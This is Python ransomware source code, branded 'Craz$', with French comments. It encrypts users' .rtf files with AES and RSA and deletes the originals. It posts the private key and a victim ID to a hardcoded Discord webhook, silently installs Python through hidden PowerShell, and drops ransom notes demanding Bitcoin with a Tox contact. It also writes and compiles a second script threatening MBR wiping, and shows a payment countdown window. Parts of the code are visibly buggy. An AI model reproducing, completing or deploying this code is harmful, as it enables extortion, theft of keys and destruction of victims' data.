import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import glob
import shutil
import ctypes
import time 
from tkinter import Tk, Label, font
from PIL import Image, ImageTk
from google_drive_downloader import GoogleDriveDownloader as gdd
import urllib.request
import sys
import json
import webbrowser
import random
import zipfile
import subprocess
from ctypes import wintypes
import psutil
import win32api
import platform



#nombre aleatoire 
number = random.randint(50000, 10000000)


# Générer une paire de clés RSA
rsa_key = RSA.generate(2048)
private_key = rsa_key.export_key()
public_key = rsa_key.publickey().export_key()

user = os.getlogin()


#Python exist ?

def RunAsAdmin():
    ctypes.windll.shell32.IsUserAnAdmin() or (ctypes.windll.shell32.ShellExecuteW(
    None, "runas", sys.executable, " ".join(sys.argv), None, 1) > 32, sys.exit())
def Is64Bit():
    return platform.machine().endswith('64')

def InstallPy():
    os_p = 64
    if not Is64Bit():
        os_p = 32
    rand_py = f'python{random.randrange(111, 9999999)}.exe'
    url = "https://www.python.org/ftp/python/3.8.1/python-3.8.1-amd64.exe" if os_p == 64 else "https://www.python.org/ftp/python/3.8.1/python-3.8.1.exe"
    subprocess.run(
        f"""powershell -ep Bypass -WindowStyle Hidden -Command "iwr -Uri {url} -OutFile c:/users/$env:username/appdata/local/temp/{rand_py}" """)
    if os.path.exists(f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}"):
        subprocess.run(
            f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py} /quiet InstallAllUsers=0 Include_launcher=0 PrependPath=1 Include_test=0")
    os.remove(f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}")
    subprocess.run("python -m pip install --upgrade pip")
    subprocess.run("python -m pip install pyinstaller psutil pywin32 requests jsonlib")
    pip_list = RunPwsh("pip list")
    if 'psutil' in pip_list.lower():
        wait4 = os.system('msg %username% in!')
    subprocess.run("msg %username% finished")
    return True





# Chiffrement du contenu d'un fichier en utilisant une clé symétrique
def encrypt_file_content(file_path, symmetric_key):
    with open(file_path, 'rb') as file:
        data = file.read()
        cipher = AES.new(symmetric_key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return cipher.nonce + tag + ciphertext

# Fonction pour envoyer la clé privée via un webhook Discord
def send_private_key_to_discord(private_key):
    webhook_url = "https://discord.com/api/webhooks/1093262885930672148/uJ8tB_NZfbFsYNWSIKkUfSDnQJXz1Odn0edx0kZLWTPeZBeKia7V9MexcWYz1YmxboGe"

    message = f"The ID is : {number}\nClé privée RSA :\n```\n{private_key.decode('utf-8')}\n```"

    payload = {
        "content": message
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)

# Appel de la fonction pour envoyer la clé privée
send_private_key_to_discord(private_key)


# Liste des répertoires à chiffrer
directories_to_encrypt = [
    "C:/Users/Admin/OneDrive/Documents",  # Le répertoire de l'utilisateur
    "C:/Users/Admin/OneDrive/Bureau",  # Répertoire Bureau
    "D:/",  # Disque D:
    "E:/",  # Disque E:
]

# Extensions de fichiers à chiffrer
extensions_to_encrypt = [".rtf"]

for directory in directories_to_encrypt:
    for extension in extensions_to_encrypt:
        files = glob.glob(os.path.join(directory, f"*{extension}"))
        for file_to_encrypt in files:
            symmetric_key = get_random_bytes(16)

            encrypted_file_name = file_to_encrypt + ".Craz$"
            encrypted_content = encrypt_file_content(file_to_encrypt, symmetric_key)
            with open(encrypted_file_name, 'wb') as encrypted_file:
                encrypted_file.write(encrypted_content)

            # Supprimer le fichier d'origine après le chiffrement
            os.remove(file_to_encrypt)

            cipher = PKCS1_OAEP.new(rsa_key)
            encrypted_key = cipher.encrypt(symmetric_key)

            private_key_file_name = encrypted_file_name + ".private_key.pem"
            symmetric_key_file_name = encrypted_file_name + ".symmetric_key.bin"


            with open(symmetric_key_file_name, 'wb') as symmetric_key_file:
                symmetric_key_file.write(encrypted_key)

            # Appel de la fonction pour envoyer la clé privée
            send_private_key_to_discord(rsa_key.export_key(), encrypted_file_name)

print("Chiffrement terminé avec succès.")


file_id = '1klWvGOcmDSKd6BAMHC1Im0ez16-2_Zph'

destination_path = f'C:/Users/{user}/wallpaper.png'


def download_file_from_google_drive(file_id, destination_path):
    try:
        gdd.download_file_from_google_drive(file_id=file_id,
                                            dest_path=destination_path,
                                            unzip=False)
    except Exception as e:
        print("ok")
download_file_from_google_drive(file_id, destination_path)


SPI_SETDESKWALLPAPER = 0x0014
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDCHANGE = 0x02

nouveau_fond_ecran = f"C:/Users/{user}/wallpaper.png"

ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, nouveau_fond_ecran, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)

#Read_me
try:
    with open(f"C:/Users/{user}/Desktop/Read_me.txt", "w") as f:
        f.write("""Hello,

All of your files have been encrypted with RSA private key(2048 bits). We use asymetric keys for the encryption.
Don't try anything with the files !!! It could break the files and the decryption file could don't work.
As you can see you have 7 days to pay the ransom. After this 7 days all of your files will be deleted and your computer will be break by our program who will overwrite in the MBR.
When you have pay we will send you the decryptor and the password to disable the overwrite MBR.
After pay create a file : PAY.txt at the destination : C:/Users/(YOURNAME)/PAY.txt
You will have 1 minute to enter the password after this time all of your file will be lost and your pc too.
Don't create this file if you don't have pay !!!!

To talk to us you have an other file who explain it named How_talk_to_us.txt
We will give you the decryptor when you will pay and all informations you need.
If you want proof that we have your Private key for decryption you can ask.

The ransom is : 200$ by Bitcoin 

We will give you our BTC adress by TOX.

Have a good day,

Craz$.
    """)
    f.close()
except: 

    with open(f"C:/Users/{user}/Read_me.txt", "w") as f:
        f.write("""Hello,

All of your files have been encrypted with RSA private key(2048 bits). We use asymetric keys for the encryption.
Don't try anything with the files !!! It could break the files and the decryption file could don't work.
As you can see you have 7 days to pay the ransom. After this 7 days all of your files will be deleted and your computer will be break by our program who will overwrite in the MBR.
When you have pay we will send you the decryptor and the password to disable the overwrite MBR.
After pay create a file : PAY.txt at the destination : C:/Users/(YOURNAME)/PAY.txt
You will have 1 minute to enter the password after this time all of your file will be lost and your pc too.
Don't create this file if you don't have pay !!!!

To talk to us you have an other file who explain it named How_talk_to_us.txt
We will give you the decryptor when you will pay and all informations you need.
If you want proof that we have your Private key for decryption you can ask.

The ransom is : 200$ by Bitcoin 

We will give you our BTC adress by TOX.

Have a good day,

Craz$.
    """)
    f.close()

try : 
    with open(f"C:/Users/{user}/Desktop/How_talk_with_us.txt", "w") as f:
        f.write("""To talk with us you need to install Tox, it's a place where we can discuss without be spy.
Install it at https://tox.chat/download.html
To start a discussion add us in Tox at the left of the windows and put our Tox id.
Our TOX ID to talk with us : 84AE91BDCE16F8FFC7FE04A05F0B0EB293FBCAEC3C9AE55DAD9F685011C03403EB8FF958C316
When you start talk with us you must say what is your ID in the file "ID.txt".
Now you can send us a message.
        """)
        f.close()
except : 
    with open(f"C:/Users/{user}/How_talk_with_us.txt", "w") as f:
        f.write("""To talk with us you need to install Tox, it's a place where we can discuss without be spy.
Install it at https://tox.chat/download.html
To start a discussion add us in Tox at the left of the windows and put our Tox id.
Our TOX ID to talk with us : 84AE91BDCE16F8FFC7FE04A05F0B0EB293FBCAEC3C9AE55DAD9F685011C03403EB8FF958C316
When you start talk with us you must say what is your ID in the file "ID.txt".
Now you can send us a message.
        """)
        f.close()





#Wiper



with open(f"C:/Users/{user}/Security_Windows.py","w") as f:
    f.write("""import os 
import sys
import random
import requests
import subprocess
import ctypes
from ctypes import wintypes
import psutil
import win32api
import platform
import time
import json




mbr_number = random.randint(10000, 10000000)

max_days = 7  # Nombre maximal de jours sans que le fichier existe
start_time = time.time()  # Temps de départ

user = os.getlogin()


webhook_url = "https://discord.com/api/webhooks/1093262885930672148/uJ8tB_NZfbFsYNWSIKkUfSDnQJXz1Odn0edx0kZLWTPeZBeKia7V9MexcWYz1YmxboGe"
bot_name = "Craz$$"
banniere = "https://www.petitgoeland.fr/488525-medium_default/preview.jpg"

payload = {
    "content" : f"The MBR number of the victim is :{mbr_number}",
    "embeds": [
        {
            "color": 16711680
        }
    ],
    "username": bot_name,
    "avatar_url": banniere
}

data = json.dumps(payload)
response = requests.post(webhook_url, data=data, headers={"Content-Type": "application/json"})


while True:
    if os.path.exists(f"C:/Users/{user}/PAY.txt"):
        for i in range(3):
            rep = input("What is your MBR number ?(You can write 3 times)")
            if rep == f"{mbr_number}":
                print("This is the correct number. Your files will not be deleted.")
                time.sleep(10)
                sys.exit()
            else:
                print("Don't write shit")
        break 
    else:
        current_time = time.time()
        elapsed_time = current_time - start_time
        
        if elapsed_time >= (max_days * 24 * 60 * 60):
            break

    time.sleep(30)





    def SetFiles(lecteur):
        print(f"Désindexation des fichiers sur le lecteur {lecteur}...")

        for dossier_parent, _, fichiers in os.walk(lecteur):
            for nom_fichier in fichiers:
                if nom_fichier.endswith(".Craz$"):
                    chemin_complet = os.path.join(dossier_parent, nom_fichier)
                    try:
                        nouveau_nom = nom_fichier.replace(".Craz$", "")
                        nouveau_chemin = os.path.join(dossier_parent, nouveau_nom)
                        os.rename(chemin_complet, nouveau_chemin)
                    except Exception as e:
                        print(f"Erreur lors de la désindexation du fichier {chemin_complet}: {str(e)}")



    def SysDown():
        # InitiateSystemShutdown()  
        os.system("shutdown -t 0 -r -f ") 

    def main():

        lecteurs = ["C:/", "D:/", "E:/", "F:/"]
        for lecteur in lecteurs:
            if os.path.exists(lecteur):
                SetFiles(lecteur)

        SetFiles()
        
        SysDown()

    if __name__ == "__main__":
        main()


""")
    f.close()



def run_cmd_commands():
    directory_path = f"C:/Users/{user}"

    # Commande à exécuter
    command = "pyinstaller --onefile --noconsole Security_Windows.py"

    try:

        subprocess.Popen(f'cd /d {directory_path} && {command}', shell=True)
    except Exception as e:
        print(f"Error : {str(e)}")


exe_file = f"C:/Users/{user}/dist/Security_Windows.exe"

try:
    subprocess.Popen([exe_file])
except FileNotFoundError:
    print(f"File {exe_file} don't find.")
except Exception as e:
    print(f"Error : {str(e)}")

#site


webbrowser.open("https://bitcoin.org/en/")



#Graphic interface


url = "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Flag_of_Russia.svg/langfr-225px-Flag_of_Russia.svg.png"


chemin_local = f"C:/Users/{user}/russia.png.ico"

urllib.request.urlretrieve(url, chemin_local)

countdown_duration = 6 * 24 * 60 * 60

current_time = time.time()
end_time = current_time + countdown_duration

window = Tk()

text3 = Label(window, text="")
text3.pack()
    
def update_label():
        time_remaining = end_time - time.time()
        days_remaining = int(time_remaining // (24 * 60 * 60))
        hours_remaining = int((time_remaining % (24 * 60 * 60)) // (60 * 60))
        minutes_remaining = int((time_remaining % (60 * 60)) // 60)
        seconds_remaining = int(time_remaining % 60)
            
        text3.config(text=f"You have : {days_remaining} days, {hours_remaining} hours, {minutes_remaining} minutes and {seconds_remaining} secondes remaining for pay.\n", fg="yellow", bg="black")
        window.after(1000, update_label)
            
F = font.Font(family='Prompt', size=18, weight="bold")
text3['font'] = F
text3.pack()

update_label()

window.title("Craz$$")
window.config(bg="black")
window.geometry("1500x800")

label2 = Label(window, text="Hi We are Craz$$ !", font=("Prompt", 45), fg="red", bg="black")
label2.pack()

text = Label(text='''\n\n\n\nWe are a cyber criminal organisation.\n\n\n Your pc have been hacked ! (find the file Read_me.txt for more precision)''', fg="red", bg="black")
text2 = Label(text="\n\n\nNo politic with us !", fg="red", bg="black")

f = font.Font(family='Prompt', size=25, weight="bold")
text['font'] = f
text.pack()

f2 = font.Font(family='Prompt', size=25, weight="bold")
text2['font'] = f2
text2.pack()

icon = Image.open(f"C:/Users/{user}/russia.png.ico")
icon = ImageTk.PhotoImage(icon)

window.iconphoto(False, icon)

window.mainloop()